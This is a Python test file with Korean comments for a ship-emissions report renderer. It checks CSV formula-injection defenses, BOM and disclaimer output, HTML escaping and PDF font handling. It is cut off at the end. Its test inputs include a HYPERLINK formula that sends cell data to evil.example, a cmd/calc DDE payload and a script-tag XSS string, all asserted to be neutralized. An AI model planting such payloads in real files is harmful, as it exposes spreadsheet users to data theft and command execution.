"""리포트 렌더링 검증 (PRD §25 · TEST_PLAN §3.4~§3.5, #361).

DB 없이 돈다 — 문서 모델을 손으로 만들어 **렌더러만** 본다. 데이터 수집은
``test_reports_db.py``가 맡는다.

이 파일이 고정하는 것 넷.

* **CSV injection 방어** — 우리가 만든 문서가 공격 매개가 되면 안 된다.
* **UTF-8 BOM** — 없으면 한국어 Windows Excel에서 한글이 전부 깨진다.
* **면책 문구** — `PRD §25.1`이 **문서 본문** 노출을 요구한다. 화면 게시로는 부족하다.
* **HTML escape** — 선박명은 사용자 입력이다.
"""

from __future__ import annotations

import asyncio
import csv
import io
import logging
import re
import threading
import time
from dataclasses import dataclass
from datetime import UTC
from pathlib import Path

import pytest
from pdf_env import pdf_environment_gap

from cii_platform.reports.csv_export import (
    BOM,
    NUMERIC_CELL,
    _iter_csv_chunks,
    iter_table_csv,
    render_csv,
    sanitize,
    serialize_cell,
)
from cii_platform.reports.document import (
    BAND_HEADERS,
    DISCLAIMER,
    ChartSection,
    KeyValueSection,
    ReportDocument,
    TableSection,
)
from cii_platform.reports.html import (
    LOGO_SVG,
    MISSING_VALUE,
    STYLESHEET,
    render_html,
)
from cii_platform.reports.html import _section_html as section_html


def _document(**over) -> ReportDocument:
    fields = {
        "title": "연간 실적 리포트 — STAR SKIPPER (2026)",
        "slug": "annual-report-x",
        "meta": [("선박", "STAR SKIPPER"), ("IMO", "9123453")],
        "sections": [
            KeyValueSection(
                title="2026년 누적 (YTD)",
                rows=[("실적 CII", "18.637188"), ("등급", "B")],
                note="연중 누적 예측값이며 공식 등급이 아닙니다.",
            ),
            TableSection(
                title="연도별 추이",
                headers=["연도", "실적 CII", "등급"],
                rows=[["2024", "17.100000", "A"], ["2025", "18.200000", "B"]],
            ),
        ],
        "warnings": ["REFERENCE_ONLY"],
    }
    fields.update(over)
    return ReportDocument(**fields)


# ─────────────────────────────────────────────────────────────────────────────
# CSV injection — TEST_PLAN §3.4~§3.5
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_dangerous_prefixes_are_neutralized(prefix):
    """스프레드시트가 수식으로 해석하는 시작 문자에 작은따옴표를 붙인다."""
    assert sanitize(f"{prefix}CMD").startswith("'")


def test_hyperlink_exfiltration_is_neutralized():
    """실제 공격 형태 — 파일을 연 사람의 데이터가 외부로 나간다."""
    payload = '=HYPERLINK("http://evil.example/?v="&A1,"click")'
    assert sanitize(payload) == f"'{payload}"


def test_negative_numbers_also_get_the_prefix():
    """문자열 규칙(`sanitize`)은 음수에도 예외를 두지 않는다.

    `-12.5`는 정상 값이지만, **이 함수 안에서** 예외를 만들면 `-1+1+cmd|...` 같은 값이
    그 예외로 빠져나간다. 「값이 수식인가」로 판정하면 판정기 자체가 취약점이 된다.

    음수를 접두 없이 내보내는 길은 **열 선언**뿐이다(`API_SPEC §8.5` · #1247) — 아래
    「수치 열 선언」 절이 그 경로를 고정한다. 이 단언은 선언 없는 셀의 종전 동작을 지킨다.
    """
    assert sanitize("-12.5") == "'-12.5"


def test_safe_values_are_untouched():
    for value in ["STAR SKIPPER", "18.637188", "B", "gCO₂/(DWT·nm)", ""]:
        assert sanitize(value) == value


def test_injection_defense_applies_to_every_cell():
    """머리글·값·각주 어디로 들어와도 막힌다 — 한 곳만 빠져도 방어가 아니다."""
    document = _document(
        sections=[
            TableSection(
                title="=TITLE",
                headers=["=HEAD"],
                rows=[["=CELL"]],
                note="=NOTE",
            )
        ]
    )
    csv_text = render_csv(document)
    for token in ["'=TITLE", "'=HEAD", "'=CELL", "'=NOTE"]:
        assert token in csv_text


# ─────────────────────────────────────────────────────────────────────────────
# 수치 열 선언 — API_SPEC §8.1·§8.5 (#1247)
#
# 서버가 Decimal에서 만든 음수는 주입 벡터가 아닌데 문자열 규칙이 `'-12.5`로 만들어
# Excel이 문자열로 읽었다. 열 선언으로만 예외를 두고, 값 모양으로는 판정하지 않는다.
# ─────────────────────────────────────────────────────────────────────────────

#: 실제 공격 형태 — `-`로 시작해 숫자처럼 보이지만 수식이다.
_MINUS_PAYLOAD = "-1+1+cmd|' /C calc'!A0"


def test_csv_validation_happens_before_the_response_starts():
    """검증은 :func:`iter_csv`를 **부르는 순간** 한다 (`#1368`).

    종전에는 제너레이터 본문 안에 있어 **첫 조각을 요구받을 때** 돌았다. 그때는
    ``StreamingResponse``가 이미 상태 코드와 헤더를 내보낸 뒤라, 예외가 나도 오류
    응답이 될 수 없고 전송이 중간에 끊길 뿐이다 — 사용자는 **깨진 파일**을 받는다.

    그래서 「반복하지 않아도 터지는가」를 본다. 검증을 제너레이터 안으로 되돌리면
    ``iter_csv(...)`` 호출만으로는 아무 일도 일어나지 않아 이 검사가 실패한다.
    """
    from cii_platform.reports.csv_export import iter_csv

    broken = _document(
        sections=[TableSection(title="표", headers=["A", "B"], rows=[["하나"]])],
    )

    with pytest.raises(ValueError, match="열 수"):
        iter_csv(broken)  # 반복하지 않는다 — 부르기만 한다


def _table_csv(headers, rows, kinds=None) -> str:
    """표 하나짜리 문서를 CSV로. 값 행만 보기 좋게 제목·면책은 그대로 둔다."""
    document = _document(
        sections=[TableSection(title="표", headers=headers, rows=rows, kinds=kinds)]
    )
    return render_csv(document)


def _data_rows(csv_text: str) -> list[list[str]]:
    """「표」 제목 다음 줄부터 빈 줄 전까지 — 머리글 + 값 행."""
    lines = csv_text.split("\r\n")
    start = lines.index("표") + 1
    rows = []
    for line in lines[start:]:
        if line == "":
            break
        rows.append(next(csv.reader([line])))
    return rows


def test_numeric_column_exports_negative_without_prefix():
    """**이 이슈의 완료 기준** — 수치 열의 `-12.5`가 `'` 없이 나가 Excel이 숫자로 읽는다."""
    rows = _data_rows(
        _table_csv(["연도", "증감"], [["2026", "-12.5"]], kinds=["string", "numeric"])
    )
    assert rows[1] == ["2026", "-12.5"]


def test_numeric_column_keeps_thousands_grouping():
    """`DESIGN_SYSTEM §4.2`가 거리·연료에 천단위 구분자를 넣는다 — 음수 거리도 숫자다."""
    rows = _data_rows(_table_csv(["거리 (nm)"], [["-4,300"]], kinds=["numeric"]))
    assert rows[1] == ["-4,300"]


def test_undeclared_columns_keep_the_old_behaviour():
    """선언하지 않으면 전부 문자열이다 — 기존 문서는 아무것도 달라지지 않는다."""
    rows = _data_rows(_table_csv(["증감"], [["-12.5"]]))
    assert rows[1] == ["'-12.5"]


def test_string_column_keeps_the_prefix_on_a_formula_that_looks_negative():
    """`-1+1+cmd|...`는 문자열 열에서 종전대로 막힌다 — 선언이 없는 곳에 예외는 없다."""
    rows = _data_rows(_table_csv(["비고"], [[_MINUS_PAYLOAD]]))
    assert rows[1] == [f"'{_MINUS_PAYLOAD}"]


@pytest.mark.parametrize(
    "value",
    [
        _MINUS_PAYLOAD,
        "=SUM(A1)",
        "+1",
        "@cmd",
        "\tcmd",
        "-1E+4",
        "- 12.5",
    ],
)
def test_numeric_column_falls_back_to_sanitize_when_the_value_is_not_a_number(value):
    """수치로 **선언된** 열이라도 값이 숫자 문법에 안 맞으면 문자열 규칙으로 되돌아간다.

    선언은 「이 열엔 서버 수치만 있다」는 약속이고, 약속이 깨진 셀을 **원문 그대로**
    내보내면 선언 한 줄이 곧 취약점이 된다. 되돌아가면 잘못 붙인 선언은 접두를 받을 뿐
    (종전 동작) 문서는 나간다 — `ValueError`로 세우면 `—`·「기록 없음」 같은 정상
    문자열이 섞인 리포트가 500이 된다.
    """
    rows = _data_rows(_table_csv(["값"], [[value]], kinds=["numeric"]))
    assert rows[1] == [f"'{value}"]


@pytest.mark.parametrize("value", ["—", "기록 없음", ""])
def test_numeric_column_passes_absent_markers_through_unchanged(value):
    """`_display`가 없는 값을 `—`로 적는다 — 수치 열의 정상 문자열이며 접두 대상도 아니다."""
    rows = _data_rows(_table_csv(["값"], [[value]], kinds=["numeric"]))
    assert rows[1] == [value]


def test_headers_title_and_note_are_sanitized_even_for_numeric_columns():
    """선언은 값 행에만 닿는다 — 라벨은 사용자 입력일 수 있어 종전대로 막는다."""
    document = _document(
        sections=[
            TableSection(
                title="=TITLE", headers=["=HEAD"], rows=[["-1"]], note="=NOTE", kinds=["numeric"]
            )
        ]
    )
    csv_text = render_csv(document)
    for token in ["'=TITLE", "'=HEAD", "'=NOTE"]:
        assert token in csv_text
    assert "'-1" not in csv_text


@pytest.mark.parametrize(
    ("value", "is_number"),
    [
        ("0", True),
        ("-0.5", True),
        ("12.346", True),
        ("4,300.0", True),
        ("-4,300", True),
        ("1e5", False),
        ("-", False),
        ("--1", False),
        ("1.2.3", False),
        (" 1", False),
        ("1,23", False),
        ("12%", False),
        ("1+1", False),
        # ASCII 숫자만 — 파이썬 `\d`는 아랍-인도 숫자·전각 숫자도 받는다(독립 리뷰 LOW).
        ("\u0661\u0662\u0663", False),
        ("\uff11\uff12\uff13", False),
    ],
)
def test_numeric_grammar_admits_only_plain_numbers(value, is_number):
    """부호 하나 · 정수부(천단위 구분자 허용) · 소수부. 연산자·함수·참조가 낄 자리가 없다."""
    assert bool(NUMERIC_CELL.fullmatch(value)) is is_number


def test_serialize_cell_never_exempts_a_string_column():
    """판정은 선언으로만 — 문자열 열은 값이 숫자여도 `sanitize`와 같다."""
    assert serialize_cell("-12.5", "string") == sanitize("-12.5")
    assert serialize_cell("-12.5", "numeric") == "-12.5"


def test_kinds_must_match_the_header_count():
    """선언이 밀리면 **다른 열의 종류**가 적용된다 — 열 수 검사와 같은 이유로 잡는다."""
    document = _document(
        sections=[
            TableSection(title="표", headers=["a", "b"], rows=[["1", "2"]], kinds=["numeric"])
        ]
    )
    with pytest.raises(ValueError, match="열 종류"):
        render_csv(document)


def test_unknown_kind_is_rejected():
    """오타(`number`)가 조용히 문자열로 읽히면 선언한 사람은 수치 열이라고 믿는다."""
    document = _document(
        sections=[TableSection(title="표", headers=["a"], rows=[["1"]], kinds=["number"])]
    )
    with pytest.raises(ValueError, match="알 수 없는 열 종류"):
        render_csv(document)


def test_table_csv_honours_kinds_the_same_way():
    """`§8.1` 자료 내보내기(`iter_table_csv`)도 같은 선언·같은 규칙이다."""
    csv_text = "".join(
        iter_table_csv(
            ["notes", "co2_ton"],
            [[_MINUS_PAYLOAD, "-12.5"]],
            kinds=["string", "numeric"],
        )
    )
    row = next(csv.reader([csv_text.split("\r\n")[1]]))
    assert row == [f"'{_MINUS_PAYLOAD}", "-12.5"]


def test_table_csv_without_kinds_prefixes_every_cell():
    csv_text = "".join(iter_table_csv(["co2_ton"], [["-12.5"]]))
    assert "'-12.5" in csv_text


# ─────────────────────────────────────────────────────────────────────────────
# 인코딩·포맷
# ─────────────────────────────────────────────────────────────────────────────


def test_csv_starts_with_bom():
    """없으면 한국어 Windows Excel이 CP949로 읽어 한글이 전부 깨진다."""
    assert render_csv(_document()).startswith(BOM)


def test_csv_uses_crlf():
    """RFC 4180 §2. LF만 쓰면 구형 Excel이 한 줄로 읽는 경우가 있다."""
    assert "\r\n" in render_csv(_document())


def test_csv_keeps_korean():
    csv_text = render_csv(_document())
    assert "STAR SKIPPER" in csv_text
    assert "연도별 추이" in csv_text


def test_csv_is_streamed_in_pieces():
    """한 번에 문자열을 만들지 않는다 — 큰 선대에서 그대로 메모리 사용량이 된다."""
    from cii_platform.reports.csv_export import iter_csv

    chunks = list(iter_csv(_document()))
    assert len(chunks) > 1
    assert chunks[0].startswith(BOM)


# ─────────────────────────────────────────────────────────────────────────────
# 면책 — PRD §25.1
# ─────────────────────────────────────────────────────────────────────────────


def test_disclaimer_is_in_csv():
    assert DISCLAIMER in render_csv(_document())


def test_disclaimer_is_in_html_body_and_footer():
    """`PRD §25.1`이 **표지·푸터** 둘 다를 요구한다.

    첫 장만 읽고 덮는 독자와 발췌 인쇄본 독자가 다르다.
    """
    html = render_html(_document())
    assert html.count(DISCLAIMER) >= 2  # 표지 <p> + @bottom-center


def test_disclaimer_text_matches_prd():
    """`PRD §6.3` 확정 문구 — 임의로 다시 쓰지 않는다."""
    assert DISCLAIMER == "본 리포트는 참고용 예측값입니다. 규제 제출용 공식 문서가 아닙니다."


# ─────────────────────────────────────────────────────────────────────────────
# HTML
# ─────────────────────────────────────────────────────────────────────────────


def test_html_escapes_user_supplied_names():
    """선박명은 사용자 입력이다 — 미리보기 화면에서 실행되면 안 된다."""
    html = render_html(_document(title="<script>alert(1)</script>"))
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html


def test_html_does_not_pin_a_font_name():
    """이름을 박으면 폰트 패키지가 바뀔 때 **조용히 tofu로** 렌더링된다.

    fontconfig가 `sans-serif`를 설치된 한국어 폰트로 해결하게 둔다.
    """
    html = render_html(_document())
    assert "font-family: sans-serif" in html
    assert "Nanum" not in html


#: 인라인 SVG의 이름공간 선언. **가져오는 주소가 아니라 이름**이다 — 이 문자열로
#: 네트워크를 타는 일은 없다. 표지 로고를 인라인하면서 들어왔다 (`#2001`).
SVG_NAMESPACE = 'xmlns="http://www.w3.org/2000/svg"'


def test_html_has_no_external_resources():
    """외부 자원을 타면 오프라인 시연에서 문서가 달라 보이고, 그 차이가 PDF에 굳는다."""
    html = render_html(_document())
    # 이름공간 선언 하나만 걷어 내고 본다. 걷어 낸 자리에 진짜 주소가 숨지 않도록
    # 개수까지 고정한다.
    assert html.count(SVG_NAMESPACE) == 1
    fetchable = html.replace(SVG_NAMESPACE, "")
    # `src=`·`href=`도 함께 막는다 — `http`가 없어도 상대 경로로 자원을 탈 수 있고,
    # 그때는 렌더링하는 **작업 디렉터리**에 따라 문서가 달라진다.
    for token in ["http://", "https://", "<link", "<script", "src=", "href="]:
        assert token not in fetchable, f"외부 자원을 탈 수 있는 표기: {token}"
    # `url(#...)`은 **같은 문서 안의 조각**을 가리킨다 (로고의 `clip-path`). 그 밖의
    # `url(`은 파일이든 주소든 문서 밖을 가리킨다.
    outside = re.findall(r"url\(\s*(?!#)[^)]*\)", fetchable)
    assert not outside, f"문서 밖을 가리키는 url(): {outside}"


def test_html_marks_numeric_cells():
    """수치는 오른쪽 정렬 + 자릿수 고정폭 — 세로로 자릿수가 맞아야 읽힌다."""
    html = render_html(_document())
    assert '<td class="num">18.637188</td>' in html
    # 값을 바꾸지는 않는다 — 정렬 판정일 뿐이다.
    assert "18.637188" in html


def test_html_keeps_every_section():
    html = render_html(_document())
    assert "2026년 누적 (YTD)" in html
    assert "연도별 추이" in html
    assert "REFERENCE_ONLY" in html


# ─────────────────────────────────────────────────────────────────────────────
# 문서 모델 검증
# ─────────────────────────────────────────────────────────────────────────────


def test_row_width_mismatch_is_caught():
    """어긋나면 CSV 열이 밀려 **다음 열의 값으로 읽힌다** — 조용히 틀리는 방식이다."""
    document = _document(sections=[TableSection(title="표", headers=["a", "b"], rows=[["1"]])])
    with pytest.raises(ValueError, match="열 수"):
        render_csv(document)


def test_empty_document_renders():
    """섹션이 없는 문서도 면책은 나가야 한다."""
    document = ReportDocument(title="빈 리포트", slug="empty")
    assert DISCLAIMER in render_csv(document)
    assert DISCLAIMER in render_html(document)


# ─────────────────────────────────────────────────────────────────────────────
# PDF — 환경이 갖춰졌을 때만
# ─────────────────────────────────────────────────────────────────────────────


def test_pdf_renders_korean_without_tofu():
    """**이 이슈의 완료 기준**이다 — PDF에 한글이 깨지지 않아야 한다.

    폰트가 없으면 오류가 아니라 tofu(□□□)로 조용히 렌더링되므로, 바이트 길이가
    아니라 **추출된 텍스트**로 확인한다. 폰트가 빠지면 추출 텍스트가 비거나
    깨지므로 이 단언이 먼저 깨진다.

    환경이 갖춰졌으면(:func:`pdf_env.pdf_environment_gap`) 그 뒤의 실패는 전부 실패다 —
    제품의 판정이 「없다」고 답하는 것도 포함한다.
    """
    gap = pdf_environment_gap()
    if gap is not None:
        pytest.skip(gap)

    import pypdf

    from cii_platform.reports import pdf as pdf_module

    assert pdf_module.is_available(), "환경 검사를 지났는데(또는 CI인데) 렌더러를 불러오지 못했다"
    assert pdf_module.has_korean_font(), "환경 검사를 지났는데(또는 CI인데) 폰트 판정이 거짓이다"

    pdf = pdf_module.render_pdf(render_html(_document()))
    assert pdf.startswith(b"%PDF-")

    text = pypdf.PdfReader(io.BytesIO(pdf)).pages[0].extract_text()
    assert "연간 실적 리포트" in text
    assert "STAR SKIPPER" in text
    # 면책이 문서 안에 있어야 한다 (PRD §25.1).
    assert "참고용 예측값" in text


def test_missing_korean_font_is_detected_not_ignored(monkeypatch: pytest.MonkeyPatch):
    """폰트가 없으면 오류 없이 tofu가 된다 — 그 상태를 코드가 알아채야 한다.

    이 함수가 없으면 배포 이미지에서 폰트 패키지가 빠져도 아무것도 실패하지 않고
    문서의 한글만 □□□가 된다.

    판정의 **양쪽**을 본다. 한국어 폰트가 있는 환경에서는 참이어야 하고, 어떤 폰트에도
    글리프가 없는 글자(영구 비문자 U+FFFF)로 프로브를 바꾸면 거짓이어야 한다 —
    폰트가 빠졌을 때 지나는 것과 같은 「글리프 없음」 경로다. 종전에는 ``bool``이기만
    하면 통과해, 늘 참이나 늘 거짓을 돌려주는 판정도 지나갔다.
    """
    gap = pdf_environment_gap()
    if gap is not None:
        pytest.skip(gap)

    from cii_platform.reports import pdf as pdf_module

    assert pdf_module.has_korean_font() is True

    monkeypatch.setattr(
        pdf_module,
        "_PROBE_HTML",
        '<html><body style="font-family: sans-serif">\uffff</body></html>',
    )
    assert pdf_module.has_korean_font() is False


def test_pdf_error_offers_csv_and_keeps_the_cause_in_the_log(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
):
    """렌더러가 없을 때 사용자를 막다른 길에 두지 않되, **원인은 로그에만** 남긴다 (`#2112`).

    종전에는 import 예외 원문(「(원인: libpango-1.0-0 not found)」)이 응답 문구에 붙었다 —
    공유 라이브러리 이름·모듈 경로는 배포 환경의 진단이지 사용자가 읽을 말이 아니다.
    """
    import sys

    from cii_platform.reports import pdf as pdf_module

    # `sys.modules`에 `None`을 두면 `import weasyprint`가 ImportError를 낸다 — 실제 부재와 같은
    # 경로다.
    monkeypatch.setitem(sys.modules, "weasyprint", None)

    with (
        caplog.at_level(logging.ERROR, logger=pdf_module.__name__),
        pytest.raises(pdf_module.PdfUnavailableError) as caught,
    ):
        pdf_module._render("<html><body>x</body></html>")

    error = caught.value
    assert error.http_status == 500  # 배포 환경 문제이지 요청 문제가 아니다
    assert error.message == pdf_module.RENDERER_UNAVAILABLE_MESSAGE
    assert "CSV" in error.message
    assert "weasyprint" not in error.message and "원인" not in error.message
    # 원인은 사라지지 않는다 — 로그가 들고 있다.
    assert any("weasyprint" in record.getMessage() for record in caplog.records)


# --- 폰트가 없으면 PDF를 내주지 않는다 (#689) --------------------------------------


def test_pdf_is_refused_when_korean_font_is_missing(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
):
    """폰트가 없는 서버는 PDF를 만들지 않는다 — 종전에는 □ 문서가 200으로 나갔다.

    **이것이 `#689`의 본체다.** 렌더링은 성공하고 한글만 tofu(□)가 되므로 HTTP 상태도
    바이트 길이도 예외도 정상이었다. 그 문서 안에 `PRD §6.3`의 면책 문구가 있다 —
    읽을 수 없는 면책이 실린 문서는 리포트가 아니다.

    렌더러 부재와 **같은 방식**으로 다룬다(500 + CSV 안내). 둘 다 사용자 입력의
    문제가 아니라 배포 환경의 문제다 (`TECH_SPEC §19.3`·`§19.4`).
    """
    from cii_platform.reports import pdf as pdf_module

    monkeypatch.setattr(pdf_module, "is_available", lambda: True)
    monkeypatch.setattr(pdf_module, "korean_font_available", lambda: False)

    with (
        caplog.at_level(logging.ERROR, logger=pdf_module.__name__),
        pytest.raises(pdf_module.PdfUnavailableError) as caught,
    ):
        pdf_module.render_pdf(render_html(_document()))

    message = caught.value.message
    # 무엇이 없는지와 무엇을 하면 되는지를 함께 말한다 — 둘 중 하나만 있으면 막힌다.
    assert "폰트" in message
    assert "CSV" in message
    # 설치 명령은 운영자의 것 — 응답이 아니라 로그에 (`#2112`).
    assert "fonts-nanum" not in message
    assert any("fonts-nanum" in record.getMessage() for record in caplog.records)


def test_missing_renderer_is_not_reported_as_a_font_problem(monkeypatch: pytest.MonkeyPatch):
    """Pango가 없는 환경에 「폰트를 설치하라」고 말하지 않는다.

    ``has_korean_font()``는 렌더러가 없을 때도 ``False``를 돌려준다. 그래서 검사
    순서를 뒤집으면 **폰트를 아무리 설치해도 해결되지 않는 환경에 폰트 안내가 나간다.**
    ``render_pdf``가 ``is_available()``을 먼저 보는 이유이며, 그 순서를 여기서 고정한다.
    """
    from cii_platform.reports import pdf as pdf_module

    monkeypatch.setattr(pdf_module, "is_available", lambda: False)
    monkeypatch.setattr(pdf_module, "korean_font_available", lambda: False)

    def _no_renderer(_html: str) -> bytes:
        raise pdf_module.PdfUnavailableError(pdf_module.RENDERER_UNAVAILABLE_MESSAGE)

    monkeypatch.setattr(pdf_module, "_render", _no_renderer)

    with pytest.raises(pdf_module.PdfUnavailableError) as caught:
        pdf_module.render_pdf("<html><body>x</body></html>")

    assert caught.value.message == pdf_module.RENDERER_UNAVAILABLE_MESSAGE
    assert "fonts-nanum" not in caught.value.message


def test_font_verdict_is_cached_per_process(monkeypatch: pytest.MonkeyPatch):
    """판정은 프로세스당 1회다 — 요청마다 프로브를 렌더링하지 않는다.

    ``has_korean_font()``는 부를 때마다 작은 문서를 실제로 렌더링한다. 요청 경로에
    그대로 두면 PDF 한 건에 렌더링이 두 번 일어난다. 설치된 폰트는 프로세스 수명
    동안 바뀌지 않으므로 한 번만 본다 (`#400`의 ``_rng_canonical_test``와 같은 이유).
    """
    from cii_platform.reports import pdf as pdf_module

    calls = {"n": 0}

    def _counting() -> bool:
        calls["n"] += 1
        return True

    pdf_module.korean_font_available.cache_clear()
    monkeypatch.setattr(pdf_module, "has_korean_font", _counting)
    try:
        assert pdf_module.korean_font_available() is True
        assert pdf_module.korean_font_available() is True
        assert pdf_module.korean_font_available() is True
        assert calls["n"] == 1
    finally:
        # 스텁이 캐시에 남아 다른 테스트를 오염시키지 않게 한다.
        pdf_module.korean_font_available.cache_clear()


def test_font_probe_does_not_go_through_the_guard(monkeypatch: pytest.MonkeyPatch):
    """프로브는 폰트 검사를 거치지 않는다 — 거치면 무한 재귀다.

    ``has_korean_font()``는 판정을 위해 문서를 렌더링하는데, 그 렌더링이 다시 판정을
    물으면 서로를 부른다. 그래서 프로브는 ``_render``로 직접 그린다.

    검사를 ``False``로 고정한 채 프로브가 ``True``를 돌려주는 것이 그 증거다 —
    ``render_pdf``를 탔다면 거부 예외에 걸려 ``False``가 됐을 것이다.
    """
    from cii_platform.reports import pdf as pdf_module

    monkeypatch.setattr(pdf_module, "is_available", lambda: True)
    monkeypatch.setattr(pdf_module, "korean_font_available", lambda: False)
    monkeypatch.setattr(pdf_module, "_render", lambda _html: b"%PDF-stub")

    assert pdf_module.has_korean_font() is True


# ---------------------------------------------------------------------------
# 표시 형식 — DESIGN_SYSTEM §4 (#584)
# ---------------------------------------------------------------------------
#
# 보고서가 **``API_SPEC §1.7`` 직렬화 자릿수를 사람이 읽는 문서에 그대로 출력**하고
# 있었다. 화면은 같은 값을 ``8.980``·``4,300 nm``로 보이는데 문서만 ``8.979907``·
# ``4300.00``이라, **같은 항차가 두 곳에서 다르게 읽혔다.**
#
# 디자인 담당이 발표 리허설에서 발견했다(2026-08-20). PDF는 심사에 나가는 산출물이라
# 화면보다 오래 남는다.


@pytest.mark.parametrize(
    ("value", "kind", "expected"),
    [
        # §4.1 🔒 CII는 소수 3자리 고정, 절사가 아니라 반올림
        ("8.9799070", "cii", "8.980"),
        ("5.0450660", "cii", "5.045"),
        # §4.2 🔒 항해거리 0자리 + 천단위 구분자
        ("4300", "distance_nm", "4,300"),
        ("12480", "distance_nm", "12,480"),
        ("999.5", "distance_nm", "1,000"),
        # §4.2 🔒 연료 1자리 + 구분자
        ("620", "fuel_ton", "620.0"),
        ("12480.55", "fuel_ton", "12,480.6"),
        # §4.2 🔒 CO₂ 1자리 + 구분자
        ("1930.68", "co2_ton", "1,930.7"),
        # §4.2 🔒 시간 1자리 (구분자 없음 — GROUPED가 아니다)
        ("83.333", "hours", "83.3"),
    ],
)
def test_display_follows_design_system_section_4(value, kind, expected):
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal(value), kind) == expected


def test_cii_has_no_thousands_separator():
    """§4.2 🔒 — 구분자는 연료·거리·CO₂ 전용이다.

    CII에 넣으면 `§4.1`이 자릿수 고정으로 확보한 소수부 정렬이 깨진다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert "," not in _display(Decimal("1234.5678"), "cii")


def test_speed_follows_section_4_2():
    """`§4.2` v2.3이 속력을 **1자리**로 확정했다 (#592).

    종전에는 표에 행이 없어 `_UNSPECIFIED_DIGITS`가 직렬화 자릿수(2)를 그대로
    쓰고 있었다. 그 상태에서 같은 값이 보고서는 `14.20`, 항차 패널은 **아예
    표시 안 됨**이었다 — 화면(`#610`)이 규정 부재를 열 제거로 표시했기 때문이다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal("14.2"), "speed_kn") == "14.2"
    assert _display(Decimal("14.25"), "speed_kn") == "14.3"


def test_days_follow_section_4_2():
    """`§4.2` v2.3이 일수를 **0자리**로 확정했다 (#592).

    종전에는 `_text()`라 서버 값이 그대로 나가 `231.640000 일`이 실렸다.
    같은 표의 「일평균 거리」·「일평균 연료」는 이미 `§4.2`를 따르고 있었다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal("231.64"), "days") == "232"
    assert _display(Decimal("133.36"), "days") == "133"


def test_unspecified_digits_is_empty():
    """규정 없는 항목이 남아 있으면 여기서 드러난다.

    이 표는 *「`§4.2`에 행이 없다」를 코드가 말하는* 자리다. 비어 있지 않다면
    정본에 빠진 항목이 있다는 뜻이므로, 그때는 이슈를 열고 이 테스트를 고친다.
    """
    from cii_platform.services.report import _UNSPECIFIED_DIGITS

    assert _UNSPECIFIED_DIGITS == {}


def test_zero_digit_kind_is_not_treated_as_missing():
    """거리의 자릿수는 **0**이라 falsy다.

    `_DISPLAY_DIGITS.get(kind) or …`로 쓰면 규정이 있는 항목이 「규정 없음」으로
    새어 나간다. 실제로 그렇게 썼다가 걸렸다 — 그 경로를 잠근다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal("4300"), "distance_nm") == "4,300"


def test_missing_value_is_em_dash():
    """빈칸은 열이 밀린 것으로 읽힌다."""
    from cii_platform.services.report import _display

    assert _display(None, "cii") == "—"


# ---------------------------------------------------------------------------
# 선종 표시 문구 (#584)
# ---------------------------------------------------------------------------


def test_ship_type_code_is_not_exposed():
    """문서에 `BULK_CARRIER`가 그대로 나가면 읽는 사람이 무엇인지 모른다."""
    from cii_platform.reports.labels import ship_type_label

    assert ship_type_label("BULK_CARRIER") == "벌크선"


def test_unknown_ship_type_shows_the_code():
    """빈칸으로 두면 「선종이 없는 배」로 읽힌다.

    새 선종이 들어왔는데 표기가 아직 없는 상태와, 값이 비어 있는 상태는 다르다.
    """
    from cii_platform.reports.labels import ship_type_label

    assert ship_type_label("NEW_SHIP_TYPE") == "NEW_SHIP_TYPE"
    assert ship_type_label(None) == "—"


def test_ship_type_labels_match_the_screen():
    """화면(`shipTypes.ts`)과 **같은 문구**를 쓴다.

    선종의 한국어 이름은 `AGENTS §4.6` 기준 **표시 문구**이고 소관은 디자인이다.
    서버가 표기를 새로 정하면 두 곳이 갈리고, 그 차이는 **문서를 열어 봐야만**
    드러난다. 여기서 대조해 그 경로를 끊는다.
    """
    import re
    from pathlib import Path

    from cii_platform.reports.labels import SHIP_TYPE_LABELS

    source = (
        Path(__file__).parents[1]
        / "frontend"
        / "src"
        / "features"
        / "vessel-registration"
        / "shipTypes.ts"
    ).read_text(encoding="utf-8")
    screen = dict(re.findall(r"\{ code: '([A-Z_]+)', label: '([^']+)'", source))

    assert screen, "shipTypes.ts에서 선종을 읽지 못했다 — 파일 형식이 바뀌었는지 확인할 것"
    assert screen == SHIP_TYPE_LABELS


def test_fuel_type_labels_match_the_screen():
    """화면(`fuelTypes.ts`)과 **같은 문구**를 쓴다 (`#598`).

    선종과 같은 구조다 — 연료의 한국어 이름은 `AGENTS §4.6` 기준 **표시 문구**이고
    화면 쪽이 원본이다. 서버가 표기를 새로 정하면 문서와 화면이 갈리고, 그 차이는
    **문서를 열어 봐야만** 드러난다.
    """
    import re
    from pathlib import Path

    from cii_platform.reports.labels import FUEL_TYPE_LABELS

    source = (
        Path(__file__).parents[1] / "frontend" / "src" / "features" / "parameters" / "fuelTypes.ts"
    ).read_text(encoding="utf-8")
    block = source.split("FUEL_TYPE_LABELS", 1)[1].split("}", 1)[0]
    screen = dict(re.findall(r"([A-Z_]+): '([^']+)'", block))

    assert screen, "fuelTypes.ts에서 연료를 읽지 못했다 — 파일 형식이 바뀌었는지 확인할 것"
    assert screen == FUEL_TYPE_LABELS


def test_fuel_type_labels_cover_the_seeded_fuels():
    """코드 집합의 정본은 `DB_SCHEMA §3.2` 값 표이며 시드가 그것을 넣는다.

    표에 없는 연료가 마스터에 있으면 그 연료만 문서에서 **코드로** 나온다 —
    `fuel_type_label`이 모르는 코드를 그대로 내기 때문에 오류 없이 지나간다.
    """
    import re
    from pathlib import Path

    from cii_platform.reports.labels import FUEL_TYPE_LABELS

    schema = (Path(__file__).parents[1] / "DB_SCHEMA.md").read_text(encoding="utf-8")
    table = schema.split("| code | display_name | cf | source_ref |", 1)[1].split("\n\n", 1)[0]
    documented = set(re.findall(r"^\| ([A-Z_]+) \|", table, re.M))

    assert len(documented) == 8, f"§3.2 연료 표를 읽지 못했다: {documented}"
    assert set(FUEL_TYPE_LABELS) == documented


def test_fuel_type_label_does_not_invent_a_name():
